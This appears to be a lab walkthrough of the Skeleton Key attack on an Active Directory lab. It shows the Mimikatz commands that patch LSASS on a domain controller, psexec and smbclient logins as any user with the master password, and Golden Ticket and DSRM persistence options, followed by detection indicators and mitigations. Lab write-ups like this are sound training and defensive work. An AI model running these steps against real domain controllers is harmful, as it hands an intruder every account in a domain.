# Skeleton Key

## Overview

Skeleton Key is a **LSASS memory patch** performed by Mimikatz (`misc::skeleton`) that injects a **master password** into the Domain Controller's authentication process. After the patch:

- **Every domain account** accepts `mimikatz` as a valid password
- **Original passwords still work** (the patch adds a second valid credential, not replaces)
- Survives until the DC reboots (in-memory only)

## Lab Misconfiguration Enabled

`Setup-ExtraAttacks.ps1` disables LSASS protection:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
  RunAsPPL     = 0   (Protected Process Light disabled)
  LsaCfgFlags  = 0   (Credential Guard disabled)
```

Without RunAsPPL, any process with `SeDebugPrivilege` can write to LSASS.

## Prerequisites

- **Domain Admin** or **SYSTEM** access on DC-01
- RunAsPPL = 0 (set by `Setup-ExtraAttacks.ps1`)
- Mimikatz with `privilege::debug` capability

## Step 1 — Get Domain Admin on DC-01

Any of these paths:
```
DCSync → dump krbtgt → Golden Ticket → DA
OR
svc_backup (DCSync rights) → secretsdump → DA
OR
ahmad.ali (IT Admins) → PTH → DC-01
```

## Step 2 — Patch LSASS (Inject Skeleton Key)

```
# On DC-01 as Administrator / DA
privilege::debug
misc::skeleton
```

Expected output:
```
[KDC] data
[KDC] struct
[KDC] keys patch OK
[WdigestCredentials] init...
[RC4_HMAC_NT] init...
Skeleton Key OK !
```

## Step 3 — Authenticate as Any User

```bash
# Now ANY domain account accepts password "mimikatz"
# From Linux attacker machine:
smbclient //192.168.56.10/C$ -U 'corp\hamad.ceo%mimikatz'
psexec.py corp.local/hamad.ceo:mimikatz@192.168.56.10

# Or any other user:
psexec.py corp.local/abdulaziz.cfo:mimikatz@192.168.56.10
```

```powershell
# From WS-01:
net use \\DC-01\C$ /user:corp\hamad.ceo mimikatz
```

## Step 4 — Cleanup / Persistence Note

The Skeleton Key patch is **not persistent** — it is lost on DC reboot.

For persistence, combine with:
- **Golden Ticket** (forged TGT using krbtgt hash — survives reboots)
- **DSRM backdoor** (local admin on DC that persists)

## Lab Attack Path

```
attacker.01 → Kerberoast svc_sql → crack hash
→ svc_sql owned → lateral move to DC-01
→ SeDebugPrivilege + RunAsPPL=0
→ misc::skeleton injected
→ "mimikatz" password works for ALL 26 lab accounts
```

## Why It Works in This Lab

| Setting | Value | Effect |
|---------|-------|--------|
| `RunAsPPL` | 0 | LSASS is not a Protected Process |
| `LsaCfgFlags` | 0 | Credential Guard disabled |
| Windows Defender | Disabled (lab) | Mimikatz not blocked |

If RunAsPPL were enabled, `misc::skeleton` would fail with:
```
ERROR kuhl_m_misc_skeleton ; Skeleton key already appears to be installed
[or]
ERROR kuhl_m_misc_skeleton ; Handle on memory (0x00000005)
```

## Detection

| Indicator | Notes |
|-----------|-------|
| LSASS memory write | Process Monitor / EDR |
| Authentication with RC4 (NTLM) from unexpected accounts | 4624, AuthPackage = Kerberos but EncryptionType = RC4 |
| Mimikatz on disk / AV alert | |
| Kerberos pre-auth failure followed by success | 4771 then 4768 |

## Mitigations (Disabled in This Lab)

- Enable `RunAsPPL` (`HKLM\...\Lsa\RunAsPPL = 1`) — prevents unsigned code from writing to LSASS
- Enable Credential Guard — moves credentials to an isolated VTL1 process
- Use EDR/AV that detects LSASS memory modification
